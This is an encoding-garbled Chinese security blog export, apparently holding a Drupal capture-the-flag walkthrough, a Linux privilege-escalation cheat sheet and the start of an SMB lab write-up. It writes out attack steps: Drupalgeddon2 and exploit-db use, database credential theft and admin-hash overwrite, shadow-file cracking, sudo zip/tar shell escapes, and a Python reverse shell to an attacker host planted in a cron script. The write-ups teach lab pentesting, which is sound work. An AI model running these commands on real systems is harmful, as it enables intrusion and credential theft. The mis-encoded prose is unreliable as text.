&emsp;&emsp;æ‰“å¼€msfï¼ŒæŸ¥æ‰¾drupalæ­¦å™¨åº“ msfconsolesearch drupal &emsp;&emsp;è¿™é‡Œå¯ä»¥æ ¹æ®éœ€æ±‚é€‰æ‹©ï¼Œæˆ‘é€‰æ‹©æ¯”è¾ƒæ–°çš„2018å¹´çš„æ”»å‡»æ¨¡å— 2ã€æ¼æ´åˆ©ç”¨ï¼ˆ1ï¼‰åå¼¹shelluse /exploit/unix/webapp/drupal_drupalgeddon2set RHOSTS 192.168.1.108 &emsp;&emsp;ä½¿ç”¨pythonåå¼¹ä¸€ä¸ªäº¤äº’å¼shell TTYï¼Œç¾åŒ–ç»ˆç«¯ python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; ï¼ˆ2ï¼‰flag1&emsp;&emsp;æŸ¥çœ‹å½“å‰ç›®å½•ï¼Œçœ‹æœ‰æ— å¯ä»¥åˆ©ç”¨çš„ä¿¡æ¯æ–‡ä»¶ï¼Œå…¶ä»–ç›®å½•ä¿¡æ¯å¦‚ä¸‹ã€‚å‘ç°äº†ç¬¬ä¸€ä¸ªflag1æ–‡ä»¶ï¼ŒæŸ¥çœ‹flag1æ–‡ä»¶ã€‚ ï¼ˆ3ï¼‰flag2&emsp;&emsp;é€šè¿‡flag1çš„æç¤ºï¼Œå‘ŠçŸ¥æˆ‘ä»¬cmsçš„é…ç½®æ–‡ä»¶å¾ˆé‡è¦ï¼Œæš—è—æ•æ„Ÿæ–‡ä»¶ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æŸ¥çœ‹ç›®å½•ä¸‹çš„å…¶ä»–æ–‡ä»¶æ¥è·å–ä¿¡æ¯ã€‚ é¦–å…ˆæˆ‘ä»¬ç™¾åº¦æœç´¢drupalæœ‰å“ªäº›é‡è¦çš„é…ç½®æ–‡ä»¶åŠé‡è¦æ–‡ä»¶çš„é»˜è®¤è·¯å¾„ ï¼ŒæŒ‘é€‰é‡ç‚¹ä¸‹æ‰‹èƒ½èŠ‚çœæ—¶é—´ã€‚ drupalçš„é…ç½®æ–‡ä»¶æ˜¯ /sites/default/settings.php ï¼Œæ˜¯æ•°æ®åº“è¿æ¥é…ç½®æ–‡ä»¶ã€‚æˆ‘ä»¬å»æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶æœ‰å¤§æ”¶è·ï¼Œæˆ‘ä»¬å‘ç°äº†flag2å†…å®¹ï¼Œä»¥åŠæ•°æ®åº“çš„è´¦æˆ·å’Œå¯†ç  &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,&#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,&#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;, ï¼ˆ4ï¼‰æ•°æ®åº“ç›¸å…³ä¿¡æ¯è·å–&emsp;&emsp;é¦–å…ˆæˆ‘ä»¬é€šè¿‡flag2å¾—åˆ°äº†æ•°æ®åº“ä¸ºmysqlæ•°æ®åº“ï¼Œå¹¶ä¸”æ•°æ®åº“åã€è´¦å·å’Œå¯†ç éƒ½æœ‰äº†ï¼Œè‚¯å®šæ˜¯è¦è¿›å…¥æ•°æ®åº“çœ‹æœ‰æ— æ‰€éœ€ä¿¡æ¯çš„ã€‚å¦‚ç³»ç»Ÿç®¡ç†å‘˜è´¦æˆ·ä¿¡æ¯ mysql -udbuser -pR0ck3t &emsp;&emsp;Drupalæ¡†æ¶é»˜è®¤çš„ç”¨æˆ·è¡¨å°±æ˜¯usersè¡¨ï¼ŒæŸ¥è¯¢usersè¡¨ä¸­ï¼Œç³»ç»Ÿç®¡ç†å‘˜adminçš„è´¦æˆ·ä¿¡æ¯ show databases;use drupaldbshow tables;select * from users; $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR &emsp;&emsp;å‘ç°adminè´¦å·å’Œç»è¿‡åŠ å¯†çš„å¯†ç ï¼Œdrupalå¸¸ç”¨å¯†ç åŠ å¯†æ˜¯MD5æ ¼å¼ï¼Œä½†æ˜¯7.0ä»¥åå› ä¸ºå®‰å…¨æ€§é—®é¢˜å°†åŠ å¯†æ–¹å¼æ”¹æˆäº†hashåŠ å¯†ï¼ˆç”±äºå¾ˆå¤šåœ¨çº¿MD5çˆ†ç ´å’ŒMD5æ•°æ®åº“ï¼Œå¯ä»¥æŸ¥åˆ°å¾ˆå¤šMD5ç çš„åŸæ–‡ï¼Œæ‰€ä»¥Drupal 7å·²ä¸å†é‡‡ç”¨Drupal 6å’Œ5ç®€å•çš„MD5åŠ å¯†ï¼Œè€Œæ˜¯é‡‡ç”¨ä¸€ç§æ–°å‹çš„HashåŠ å¯†æ–¹æ³•ã€‚æ–°å‹åŠ å¯†æ–¹æ³•æ˜¯â€œåŠ äº†ç›ï¼ˆSaltï¼‰â€çš„MD5ç ï¼Œç®€å•ç†è§£å°±æ˜¯å¹¶ä¸ä¼šç›´æ¥å°†passwordè¿›è¡ŒMD5åŠ å¯†ï¼Œè€Œä¼šå’Œç”¨æˆ·åæˆ–å…¶å®ƒéšæœºå­—ç¬¦ä¸²ç»„åˆåœ¨ä¸€èµ·åå†MD5åŠ å¯†ã€‚ï¼‰ã€‚ &emsp;&emsp;è¿™é‡Œä¸æ˜¯md5åŠ å¯†ï¼Œåº”è¯¥æ˜¯è‡ªå®šä¹‰çš„åŠ å¯†æ–¹å¼ã€‚flag2ä¸­ç»™çš„æç¤ºæš´åŠ›ç ´è§£ä¸æ˜¯å”¯ä¸€çš„æ–¹æ³•æˆ‘ä»¬å¾—æƒ³ä¸€ä¸‹å…¶ä»–çš„åŠæ³•ã€‚ ï¼ˆ5ï¼‰æ•°æ®åº“adminç®¡ç†å‘˜å¯†ç ä¿®æ”¹åŠè·å–flag3&emsp;&emsp;æˆ‘ä»¬æƒ³åŠæ³•çš„åŒæ—¶ä¹Ÿå¯ä»¥ç™¾åº¦å‘å¼€å‘äººå‘˜è¯¢é—®ç­”æ¡ˆï¼ŒæŸ¥æ‰¾drupal7å¿˜è®°å¯†ç æ€ä¹ˆåŠï¼Ÿdrupal7å¦‚ä½•é‡ç½®å¯†ç ï¼Ÿdrupal7å¦‚ä½•ä¿®æ”¹å¯†ç ï¼Ÿè¿™äº›é—®é¢˜è®©æˆ‘ä»¬æ‹¿åˆ°adminè¿™ä¸ªç®¡ç†å‘˜è´¦æˆ·ã€‚ drupal7é‡ç½®adminç”¨æˆ·çš„å¯†ç  php scripts/password-hash.sh 123456 &emsp;&emsp;è¿™æ ·å°±èƒ½è·å–åŠ å¯†åçš„å¯†ç  &emsp;&emsp;è¿›å…¥æ•°æ®åº“ï¼Œä¿®æ”¹adminçš„å¯†ç ï¼ˆå¯†æ–‡ï¼‰ mysql -udbuser -pR0ck3tuse drupaldb;update users set pass=&quot;$S$DFrLnFFXTGFCqK75zqX7nXsNI271QDS5pDN7uIOgcguQK81Fj1LI&quot; where name=&quot;admin&quot;; ç™»å½•æˆåŠŸ ï¼ˆ7ï¼‰æ›´éšè”½æ–¹å¼ï¼Œæ·»åŠ æ–°ç®¡ç†å‘˜è´¦æˆ·è·å–flag3&emsp;&emsp;exploit-dbï¼ˆæ¼æ´åˆ©ç”¨åº“ï¼‰ï¼škaliä¸­å·²ç»å†…ç½®ï¼Œé»˜è®¤è·¯å¾„ä¸ºï¼š/pentest/exploits/exploitdbã€‚å¯ä»¥ä½¿ç”¨searchsploitå‘½ä»¤æ¥æœç´¢expè¿›è¡Œåˆ©ç”¨ã€‚ &emsp;&emsp;åœ¨exploitdbä¸­æœ‰ä¸€ä¸ªé’ˆå¯¹Drupal 7ç‰ˆæœ¬çš„æ”»å‡»è„šæœ¬ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªadminæƒé™çš„ç”¨æˆ·è´¦å·ï¼Œç¬¬äºŒç§æ–¹æ³•æ˜¯é€šè¿‡è¯¥è¿‡ç¨‹æ–°å¢adminå¯†ç ã€‚ æŸ¥çœ‹Drupalç‰ˆæœ¬ï¼Œç¡®å®šDrupalç‰ˆæœ¬ä¸º7.24 cat /var/www/includes/bootstrap.inc | grep VERSION ä½¿ç”¨searchsploitæŸ¥æ‰¾å¯åˆ©ç”¨æ¼æ´ã€‚é€‰æ‹©æ·»åŠ ç®¡ç†å‘˜åŠŸèƒ½çš„æ”»å‡»è„šæœ¬é€‚ç”¨äº7.0-7.31èŒƒå›´ï¼ˆæ¯ä¸ªè„šæœ¬æ‹¬å·åé¢æœ‰åŠŸèƒ½æè¿°ï¼‰ï¼Œç¬¦åˆ7.24ç‰ˆæœ¬ã€‚ searchsploit drupal åˆ©ç”¨drupal7.0ç‰ˆæœ¬æ¼æ´å¢åŠ æœ‰adminæƒé™çš„ç”¨æˆ· python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.43.62 -u w01ke -p w01keåé¢é¶æœºå‡ºäº†ç‚¹é—®é¢˜ï¼Œé¶æœºipæ¢æˆäº†192.168.43.62 &emsp;&emsp;æ–°å¢çš„ç®¡ç†å‘˜ç”¨æˆ·å¦‚ä¸‹ &emsp;&emsp;ä½¿ç”¨æ–°æ·»åŠ çš„ç”¨æˆ·w01keç™»å½•ç½‘ç«™ï¼Œåœ¨contentæ¨¡å—ä¸‹æ‰¾åˆ°flag3ã€‚ Congratulationsï¼Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.æ­å–œä½ !ç‰¹æ®Šçš„PERMSå¯ä»¥å¸®åŠ©æ‰¾åˆ°å¯†ç -ä½†æ‚¨éœ€è¦-execè¯¥å‘½ä»¤ï¼Œä»¥ç¡®å®šå¦‚ä½•è·å–åœ¨shadowæ–‡ä»¶ä¸­çš„å†…å®¹å¾ˆæ˜æ˜¾çš„æç¤ºï¼šfind+perms+exec å‘½ä»¤ç”¨æ¥ææƒ äº”ã€ææƒ&emsp;&emsp;æ ¹æ®flag3çš„æç¤ºææƒï¼Œæˆ‘ä»¬å°è¯•æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨ä¿¡æ¯ï¼ˆåŒ…å«ç”¨æˆ·æƒé™ä¿¡æ¯ï¼‰ï¼Œè¿™äº›ç”¨æˆ·ä¿¡æ¯ä¸€èˆ¬å­˜å‚¨åœ¨/etc/passwdç›®å½•ä¸‹ã€‚ &emsp;&emsp;æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨ï¼Œè·å–ä¿¡æ¯ cat /etc/passwd &emsp;&emsp;å‘ç°äº†flag4è¿™ä¸ªç”¨æˆ·ï¼Œå¹¶ä¸”å¾—åˆ°äº†flag4çš„ä¸»ç›®å½•ä¸ºhomeç›®å½•ã€‚æˆ‘ä»¬åˆ‡æ¢åˆ°homeç›®å½•å¯»æ‰¾flag4ç›¸å…³æ–‡ä»¶ cd /home/flag4cat flag4.txt flag4æç¤ºå†…å®¹:æç¤ºæœ€åflag in rootä¸‹é¢ã€‚ &emsp;&emsp;å…¶å®ä¹Ÿå¯ä»¥ç›´æ¥ç”¨findå‘½ä»¤æŸ¥æ‰¾flag4è¿™ä¸ªå…³é”®å­—ï¼Œä¹Ÿèƒ½çˆ†å‡ºflag4æ–‡ä»¶çš„è·¯å¾„ã€‚ä¸»è¦çœ‹ä¸ªäººæ€è·¯ find / -name &quot;flag4cd /home/flag4cat flag4.txt &emsp;&emsp;æ ¹æ®flag4çš„æç¤ºä¿¡æ¯ï¼Œæœ€åä¸€ä¸ªflagå­˜åœ¨äºrootç›®å½•ä¸‹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨findå‘½ä»¤æŸ¥æ‰¾rootç›®å½•ä¸‹ç›¸å…³æ–‡ä»¶ä¿¡æ¯ã€‚ ä½¿ç”¨findå‘½ä»¤æŸ¥çœ‹ä¸/rootç›®å½•æœ‰å…³çš„æ–‡ä»¶ä¿¡æ¯ find /rootfindå‘½ä»¤æ˜¯ç”¨æ¥åœ¨æŒ‡å®šç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶ã€‚ä»»ä½•ä½äºå‚æ•°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ½å°†è¢«è§†ä¸ºæ¬²æŸ¥æ‰¾çš„ç›®å½•åã€‚å¦‚æœä½¿ç”¨è¯¥å‘½ä»¤æ—¶ï¼Œä¸è®¾ç½®ä»»ä½•å‚æ•°ï¼Œåˆ™findå‘½ä»¤å°†åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾å­ç›®å½•ä¸æ–‡ä»¶ï¼Œå¹¶å°†æŸ¥æ‰¾åˆ°çš„å­ç›®å½•å’Œæ–‡ä»¶å…¨éƒ¨è¿›è¡Œæ˜¾ç¤ºã€‚find(é€‰é¡¹)(å‚æ•°)-exec&lt;æ‰§è¡ŒæŒ‡ä»¤&gt;ï¼šå‡è®¾findæŒ‡ä»¤çš„å›ä¼ å€¼ä¸ºTrueï¼Œå°±æ‰§è¡Œè¯¥æŒ‡ä»¤-perm&lt;æƒé™æ•°å€¼&gt;ï¼šæŸ¥æ‰¾ç¬¦åˆæŒ‡å®šçš„æƒé™æ•°å€¼çš„æ–‡ä»¶æˆ–ç›®å½• &emsp;&emsp;å‘ç°flagæ–‡ä»¶å­˜åœ¨äº/rootç›®å½•ä¸‹ï¼Œå°è¯•æ‰“å¼€å®ƒï¼Œå‘ç°æ²¡æœ‰æƒé™ï¼Œæ‰€ä»¥å¿…é¡»è¦ææƒæ‰èƒ½æŸ¥çœ‹æœ€ç»ˆçš„flagæ–‡ä»¶ æ ¹æ®flag3ä¸­çš„æç¤ºï¼Œä½¿ç”¨â€-execâ€œææƒ,ä¹Ÿå°±æ˜¯find+perms+exec å‘½ä»¤æ¥ææƒã€‚è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç”¨ï¼Œçœ‹ä¸ªäººæƒ³æ³•ã€‚è¯¦ç»†å…³äºfindææƒä¼šåœ¨å¦ä¸€ç¯‡æ–‡ç« ä¸­è¯¦è§£ 1. find ./ acce -exec &#x27;/bin/sh&#x27; \\;2. touch bccefind bcce -exec &#x27;/bin/sh&#x27; \\; &emsp;&emsp;æˆåŠŸè®¿é—®æœ€åä¸€ä¸ªflagæ–‡ä»¶ï¼Œæ¸¸æˆç»“æŸäº†ã€‚ å…­ã€æ€»ç»“&emsp;&emsp;æœ¬æ¬¡åˆçº§å†…ç½‘æ¸—é€é¶åœºè™½ç„¶åˆçº§ï¼Œä½†ä¹Ÿæ¶‰åŠäº†å¤§é‡çš„çŸ¥è¯†ç‚¹ã€‚ ä½¿ç”¨pythonåå¼¹ä¸€ä¸ªäº¤äº’å¼shell é…ç½®æ–‡ä»¶ååˆ†é‡è¦ï¼Œé‡è¦çš„é…ç½®æ–‡ä»¶å¯ä»¥æœç´¢ç›¸å…³ç³»ç»Ÿæˆ–è€…æ¡†æ¶çš„é»˜è®¤è·¯å¾„ï¼Œèƒ½åœ¨è¾ƒçŸ­æ—¶é—´å†…è·å–æœ‰ç”¨ä¿¡æ¯ã€‚å¦‚ï¼š drupalçš„/sites/default/settings.php ï¼Œæ˜¯æ•°æ®åº“è¿æ¥é…ç½®æ–‡ä»¶ exploit-dbï¼ˆæ¼æ´åˆ©ç”¨åº“ï¼‰çœŸçš„å¾ˆå¼ºå¤§ï¼Œé‡Œé¢å¾ˆå¤šæ”»å‡»è„šæœ¬ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆä»¥å‰å¾ˆå°‘ç”¨ï¼Œç°åœ¨è¦åŠ å¼ºå¯¹ä»–çš„äº†è§£äº†ã€‚ä»–å°±æ˜¯metspoitçš„å…„å¼Ÿ /etc/passwdï¼šlinuxé»˜è®¤å­˜å‚¨ç”¨æˆ·åˆ—è¡¨çš„æ–‡ä»¶ linux suidææƒç›¸å…³çŸ¥è¯†ï¼Œåœ¨åé¢çš„æ–‡ç« ä¸­å†è¯¦ç»†äº†è§£ã€‚ å‚è€ƒé“¾æ¥ï¼šhttps://www.cnblogs.com/kbhome/p/13296397.html","categories":[{"name":"ç»¼åˆé¶åœº","slug":"ç»¼åˆé¶åœº","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"Drupal","slug":"Drupal","permalink":"https://wolke.cn/tags/Drupal/"}],"author":"w01ke"},{"title":"Linuxææƒçš„å„ç§å§¿åŠ¿","slug":"Linuxææƒçš„å„ç§å§¿åŠ¿","date":"2021-12-09T15:45:17.000Z","updated":"2023-02-20T02:43:19.942Z","comments":true,"path":"post/927dc08e.html","link":"","permalink":"https://wolke.cn/post/927dc08e.html","excerpt":"","text":"ä¸€ã€ææƒä»‹ç»&emsp;&emsp;å¾€å¾€æˆ‘ä»¬èƒ½æ‹¿ä¸‹æœåŠ¡å™¨çš„webæœåŠ¡åªæ˜¯å…·æœ‰ä½æƒé™ç”¨æˆ·(www-data)ï¼Œå¯¹äºå†…ç½‘æ¸—é€ï¼Œæˆ‘ä»¬éœ€è¦ææƒåˆ°rootã€‚Linuxç³»ç»Ÿçš„ææƒè¿‡ç¨‹ä¸æ­¢æ¶‰åŠåˆ°äº†æ¼æ´ï¼Œä¹Ÿæ¶‰åŠäº†å¾ˆå¤šç³»ç»Ÿé…ç½®ã€‚ ææƒå‰æ: å·²ç»æ‹¿åˆ°ä½æƒshell è¢«å…¥ä¾µçš„æœºå™¨ä¸Šé¢æœ‰ncï¼Œpythonï¼Œperlç­‰linuxéå¸¸å¸¸è§çš„å·¥å…· æœ‰æƒé™ä¸Šä¼ æ–‡ä»¶å’Œä¸‹è½½æ–‡ä»¶ äºŒã€å†…æ ¸æ¼æ´ææƒ&emsp;&emsp;å†…æ ¸æ¼æ´æ˜¯æˆ‘ä»¬å‡ ä¹æœ€å…ˆæƒ³åˆ°çš„ææƒæ–¹æ³•ã€‚é€šæ€çš„å†…æ ¸æ¼æ´æ˜¯ååˆ†å°‘è§çš„ï¼Œå› è€Œæˆ‘ä»¬åº”è¯¥å…ˆå¯¹ç³»ç»Ÿç›¸å…³çš„ä¿¡æ¯è¿›è¡Œæ”¶é›† æŸ¥çœ‹å‘è¡Œç‰ˆæœ¬ï¼š cat /etc/issuecat /etc/*-releaselsb_release -acat /etc/lsb-releasecat /etc/redhat-releasedmesg | grep Linuxls /boot | grep vmlinuz æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ï¼š uname -acat /proc/versionuname -mrsrpm -q kernel æ‰¾åˆ°ç³»ç»Ÿç‰ˆæœ¬å·ï¼Œé€šè¿‡kaliçš„searchsploitæŸ¥æ‰¾è¯¥ç‰ˆæœ¬æ˜¯å¦å­˜åœ¨æ¼æ´ å‘ç°ä¸å­˜åœ¨å†…æ ¸æº¢å‡ºä»£ç  å‡è‹¥å­˜åœ¨å†…æ ¸æº¢å‡ºä»£ç ï¼Œå¯é€šè¿‡å¦‚ä¸‹å‘½ä»¤ï¼Œä¸Šä¼ å†…æ ¸æº¢å‡ºä»£ç ï¼Œç¼–è¯‘æ‰§è¡Œ gcc xxx.c -o exploit [-lpthread]chmod +x exploit./exploit ä¸‰ã€æ˜æ–‡rootææƒ-é€šè¿‡passwdå’Œshadowç ´è¯‘å¯†ç &emsp;&emsp;å¤§å¤šlinuxç³»ç»Ÿçš„å¯†ç éƒ½å’Œ/etc/passwdå’Œ/etc/shadowè¿™ä¸¤ä¸ªé…ç½®æ–‡ä»¶æ¯æ¯ç›¸å…³ã€‚passwdé‡Œé¢å‚¨å­˜äº†ç”¨æˆ·ï¼Œshadowé‡Œé¢æ˜¯å¯†ç çš„hashã€‚å‡ºäºå®‰å…¨è€ƒè™‘passwdæ˜¯å…¨ç”¨æˆ·å¯è¯»ï¼Œrootå¯å†™çš„ã€‚shadowæ˜¯ä»…rootå¯è¯»å†™çš„ã€‚ &emsp;&emsp;ä¾‹å¦‚ç ´è§£linuxç”¨æˆ·åå’Œå¯¹åº”çš„å¯†ç  /etc/passwd /etc/shadowunshadow passwd shadow &gt; crackedjohn cracked å››ã€è®¡åˆ’ä»»åŠ¡&emsp;&emsp;ç³»ç»Ÿå†…å¯èƒ½ä¼šæœ‰ä¸€äº›å®šæ—¶æ‰§è¡Œçš„ä»»åŠ¡ï¼Œä¸€èˆ¬è¿™äº›ä»»åŠ¡ç”±crontabæ¥ç®¡ç†ï¼Œå…·æœ‰æ‰€å±ç”¨æˆ·çš„æƒé™ã€‚érootæƒé™çš„ç”¨æˆ·æ˜¯ä¸å¯ä»¥åˆ—å‡ºrootç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡çš„ã€‚ä½†æ˜¯/etc/å†…ç³»ç»Ÿçš„è®¡åˆ’ä»»åŠ¡å¯ä»¥è¢«åˆ—å‡º &emsp;&emsp;ä½¿ç”¨å‘½ä»¤ï¼šcat /etc/crontab å›è½¦æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ &emsp;&emsp; é»˜è®¤è¿™äº›ç¨‹åºä»¥rootæƒé™æ‰§è¡Œï¼Œå¦‚æœæœ‰å¹¸é‡åˆ°ä¸€ä¸ªæŠŠå…¶ä¸­è„šæœ¬é…ç½®æˆä»»æ„ç”¨æˆ·å¯å†™çš„ç®¡ç†å‘˜ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹è„šæœ¬ç­‰å›è¿root shellï¼›å¦‚æœå®šæ—¶æ‰§è¡Œçš„æ–‡ä»¶æ˜¯pyè„šæœ¬ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„è„šæœ¬æ¥æ›¿æ¢ä¹‹å‰çš„è„šæœ¬ï¼š #!/usr/bin/pythonimport os,subprocess,sockets=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;æ”»å‡»æœºIPåœ°å€&quot;,&quot;æ”»å‡»æœºç›‘å¬ç«¯å£&quot;))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]) &emsp;&emsp;æ”»å‡»æœºå¯åŠ¨ncç›‘å¬ç«¯å£ï¼šnc -nlvp port äº”ã€å¯†ç å¤ç”¨&emsp;&emsp;å¾ˆå¤šç®¡ç†å‘˜ä¼šé‡å¤ä½¿ç”¨å¯†ç ï¼Œå› æ­¤æ•°æ®åº“æˆ–è€…webåå°çš„å¯†ç ä¹Ÿè®¸å°±æ˜¯rootå¯†ç ã€‚ &emsp;&emsp;æœ‰äº†ï¼ˆç–‘ä¼¼)ï¼‰ rootå¯†ç æ€ä¹ˆåŠï¼Ÿä½ ä¸€å®šæƒ³sshç™»é™†ã€‚ç„¶è€Œsshå¾ˆå¯èƒ½ç¦æ­¢rootç™»é™†ï¼Œæˆ–æ˜¯é˜²ç«å¢™è§„åˆ™å°†ä½ æ’é™¤åœ¨å¤–äº†ã€‚è¿”å›æ¥æƒ³ï¼Œæˆ‘ä»¬ä¸æ˜¯æœ‰ä¸€ä¸ªä½æƒshelläº†å—ï¼Ÿæ‰¾ä¸ªåŠæ³•åœ¨ä¸Šé¢â€œè¾“å…¥â€å¯†ç å°±å¥½äº†ã€‚æ˜¾ç„¶ï¼Œç›´æ¥åœ¨ä½æƒshellé‡Œé¢ç”¨sudoæ˜¯ä¸å¥æ•ˆçš„ã€‚è¿™æ˜¯å› ä¸ºå‡ºäºå®‰å…¨è€ƒè™‘linuxè¦æ±‚ç”¨æˆ·å¿…é¡»ä»ç»ˆç«¯è®¾å¤‡ï¼ˆttyï¼‰ä¸­è¾“å…¥å¯†ç ï¼Œè€Œä¸æ˜¯æ ‡å‡†è¾“å…¥(stdinï¼‰ã€‚æ¢å¥è¯è¯´ï¼Œsudoåœ¨ä½ è¾“å…¥å¯†ç çš„æ—¶å€™æœ¬è´¨ä¸Šæ˜¯è¯»å–äº†é”®ç›˜ï¼Œè€Œä¸æ˜¯bashé‡Œé¢è¾“å…¥çš„å­—ç¬¦ã€‚å› æ­¤ä¸ºäº†èƒ½å¤Ÿè¾“å…¥å¯†ç ï¼Œæˆ‘ä»¬å¿…é¡»æ¨¡æ‹Ÿä¸€ä¸ªç»ˆç«¯è®¾å¤‡ã€‚pythonå°±æœ‰è¿™æ ·çš„åŠŸèƒ½ã€‚åœ¨shellé‡Œé¢è¾“å…¥ï¼š python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27; å…­ã€zipã€rarææƒsudo â€“l å‘ç°å¯ä»¥ä½¿ç”¨rootæ‰§è¡Œzipå’Œtarå‘½ä»¤ &emsp;&emsp;åˆ©ç”¨zipè¿›è¡Œææƒ touch exploit æ–°å»ºexploitæ–‡ä»¶sudo -u root zip exploit.zip exploit -T -unzip -command=&quot;sh -c /bin/bash&quot; &emsp;&emsp;åˆ©ç”¨tarè¿›è¡Œææƒ sudo -u root tar cf /dev/null exploit -checkpoint=1 --checkpoint -action=&quot;/bin/bash&quot;","categories":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"https://wolke.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"ææƒ","slug":"ææƒ","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"å†…ç½‘å®‰å…¨","slug":"å†…ç½‘å®‰å…¨","permalink":"https://wolke.cn/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"SMBä¿¡æ¯æ³„éœ²","slug":"SMBä¿¡æ¯æ³„éœ²","date":"2021-12-09T13:25:49.000Z","updated":"2022-01-03T03:29:39.556Z","comments":true,"path":"post/6e6874d7.html","link":"","permalink":"https://wolke.cn/post/6e6874d7.html","excerpt":"","text":"ä¸€ã€é¶æœºè¯´æ˜1ã€ä¸‹è½½é“¾æ¥&emsp;&emsp;é¶åœºé•œåƒï¼šé“¾æ¥: https://pan.baidu.com/s/1xfKILyIzELi_ZgUw4aXT7w æå–ç : 59g0 2ã€é¶æœºå‡†å¤‡ï¼ˆ1ï¼‰é‡ç½®é¶åœºå¯†ç &emsp;&emsp;é‡å¯ä¸»æœºï¼Œç–¯ç‹‚æŒ‰shiftï¼Œè¿›å…¥å¦‚ä¸‹ç•Œé¢åï¼ŒæŒ‰e &emsp;&emsp;æ‰¾åˆ°linuxå¼€å¤´çš„è¡Œï¼Œåœ¨æœ€åè¾“å…¥ init=/bin/bashï¼Œè¾“å…¥å®ŒæˆåæŒ‰Crtl+X &emsp;&emsp;mount -o rw,remount /ï¼Œå›è½¦ &emsp;&emsp;passwd rootï¼Œè¾“å…¥æ–°å¯†ç ä¸¤æ¬¡ &emsp;&emsp;å¦‚æœæç¤ºæ”¹å˜å¯†ç æˆåŠŸï¼Œé‡å¯è¯¥è™šæ‹Ÿæœº ï¼ˆ2ï¼‰æŸ¥çœ‹IP&emsp;&emsp;ä½¿ç”¨åˆšæ‰ä¿®æ”¹çš„å¯†ç è¿›å…¥é¶åœºä¸»æœºï¼Œè¾“å…¥ip aï¼ŒæŸ¥çœ‹IPåœ°å€ äºŒã€ä¿¡æ¯æ”¶é›†1ã€æ¢æµ‹ä¸»æœºIP&emsp;&emsp;å¯ä»¥ä½¿ç”¨arp-scanæˆ–è€…netdiscover ï¼ˆ1ï¼‰arp-scan&emsp;&emsp;ä½¿ç”¨arp-scanæ¢ç´¢é¶æœºIPï¼Œå‘ç°IPåœ°å€ä¸º192.168.1.107 arp-scan -l ï¼ˆ2ï¼‰netdiscovernetdiscover -r 192.168.1.1/24 2ã€å¼€æ”¾ç«¯å£ä¸æœåŠ¡æ‰«æ&emsp;&emsp;ä½¿ç”¨nmapå¯¹IPè¿›è¡Œæ‰«æï¼š nmap -sV 192.168.1.107 &emsp;&emsp;å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†SMBã€Mysqlã€SSHæœåŠ¡ ä¸‰ã€æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨1ã€é’ˆå¯¹SMBåè®®å¼±ç‚¹æ£€æµ‹&emsp;&emsp;å› ä¸ºè¿™èŠ‚ä¸»è¦é’ˆå¯¹çš„æ˜¯smbåè®®ï¼Œæ‰€ä»¥å¯¹å…¶è¿›è¡Œä¸€æ³¢æ¢æµ‹&emsp;&emsp;é¦–å…ˆï¼Œä½¿ç”¨ç©ºå£ä»¤: smbclient -L IPï¼Œåˆ—å‡ºè¯¥ipæ‰€åˆ†äº«çš„æ–‡ä»¶å’Œé“¾æ¥ã€‚ Print æ˜¯ å…±äº«é©±åŠ¨ ï¼Œ å°±æ˜¯å…±äº«æ‰“å°æœº Share æ˜¯å…±äº«æ–‡ä»¶å¤¹IPC$ æ˜¯å…±äº«ç©ºè¿æ¥ï¼Œä¸éœ€è¦ç”¨æˆ·åå°±èƒ½ç™»é™†çš„webæœåŠ¡å™¨ &emsp;&emsp;æŸ¥çœ‹printé‡Œé¢çš„ä¸œè¥¿ï¼ˆæ²¡æœ‰æƒé™ï¼‰ smbclient &#x27;\\\\IP\\print$&#x27; &emsp;&emsp;æŸ¥çœ‹shareå…±äº«æ–‡ä»¶å¤¹é‡Œçš„ä¸œè¥¿ smbclient &#x27;\\\\IP\\share$&#x27; &emsp;&emsp;get+æ–‡ä»¶åï¼Œå¯ä»¥ä¸‹è½½è·å¾—æ–‡ä»¶ä¿¡æ¯ &emsp;&emsp;æ‰“å¼€æ–°çš„ç»ˆç«¯ï¼Œæ‰“å¼€æ–‡ä»¶ï¼šå‘ç°å†™ç€å¯†ç ä¸º12345 